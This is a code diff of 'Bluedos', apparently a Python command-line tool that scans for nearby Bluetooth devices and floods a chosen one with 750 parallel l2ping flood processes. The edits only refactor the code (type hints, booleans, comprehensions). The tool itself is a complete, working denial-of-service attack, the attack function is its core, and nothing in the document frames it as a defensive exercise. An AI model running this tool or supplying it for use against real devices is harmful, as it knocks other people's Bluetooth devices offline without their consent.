@@ -1,16 +1,18 @@
+# coding=utf-8
+"""Bluedos by @ceigh"""
 from os import getuid, kill
 from subprocess import check_output, Popen, DEVNULL
 from time import sleep
 
 
-def confirm(question):
+def confirm(question: str) -> bool:
     try:
-        while 1:
+        while True:
             reply = input(f"{question}: ").lower()[:1]
             if reply in 'yosjtdд':  # (international), using {in} to consider enter too
-                return 1
+                return True
             elif reply == 'n':
-                return 0
+                return False
     except (KeyboardInterrupt, EOFError):
         bye()
 
@@ -22,23 +24,27 @@ def bye():
     exit(0)
 
 
-def get_devices():
+def get_devices() -> list:
     if not len(check_output(['hcitool', 'dev'])[9:]):
         exit("Enable Bluetooth first")
     print("\033cScanning...\n")
     hcitool_out = check_output(['hcitool', 'scan']).decode()[13:-1]
-    devices = [i.split('\t')[1:] for i in hcitool_out.split('\n') if len(hcitool_out) != 0]
+    devices = [
+        i.split('\t')[1:]
+        for i in hcitool_out.split('\n')
+        if len(hcitool_out) != 0
+    ]
     return devices
 
 
-def attack(target):
+def attack(target: list):
     from signal import SIGTERM
     print(f"\033c\nTrying on '{target[1]}', please wait...")
-    pids = [Popen(['l2ping', '-f', '-s', '660', target[0]], stdout=DEVNULL).pid for i in range(750)]
+    pids = [Popen(['l2ping', '-f', '-s', '660', target[0]], stdout=DEVNULL).pid for pid in range(750)]
     try:
         input(f"\033c\nAttacking '{target[1]}', press enter to stop... ")
     finally:
-        list(map(lambda pid: kill(pid, SIGTERM), pids))
+        [kill(pid, SIGTERM) for pid in pids]
         bye()
 
 
@@ -55,7 +61,7 @@ def main():
         print("\033c\nSeveral devices found:\n")
         for index, device in enumerate(devices):
             print(f"{index}) '{device[1]}'\t<{device[0]}>")
-        while 1:
+        while True:
             try:
                 target_i = int(input(f"\nSelect a device (0-{dev_number - 1}): "))
                 if target_i in range(dev_number):
